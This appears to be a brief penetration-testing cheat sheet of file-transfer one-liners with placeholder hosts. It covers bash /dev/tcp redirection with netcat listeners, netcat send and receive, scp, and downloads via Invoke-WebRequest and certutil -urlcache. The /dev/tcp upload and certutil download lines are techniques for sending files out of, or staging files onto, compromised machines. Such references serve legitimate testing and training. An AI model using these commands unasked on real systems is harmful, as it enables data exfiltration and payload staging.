## Bash with Netcat listener
Upload:
```bash
bash -c 'cat <FILE> > /dev/tcp/<IP>/<PORT>'
nc -lnvp <PORT> > <FILE>
```

Download:
```bash
bash -c 'cat < /dev/tcp/<IP>/<PORT> > <FILE>'
nc -lnvp <PORT> < <FILE>
```

## Netcat
```bash
nc -q 0 <IP> <PORT> < <FILE> (sender)
nc -lnvp <PORT> > <FILE> (receiver)
```

## SCP (SSH)
Upload:
```bash
scp <FILE> <USER>@<IP>:<FILE> -P <PORT>
```

Download:
```bash
scp <USER>@<IP>:<FILE> -P <PORT>
```

## HTTP download
```bash
Invoke-WebRequest "http://<IP>/<FILE>" -OutFile "<FILE>"
certutil -urlcache -f http://<IP>/<FILE> <FILE>
```
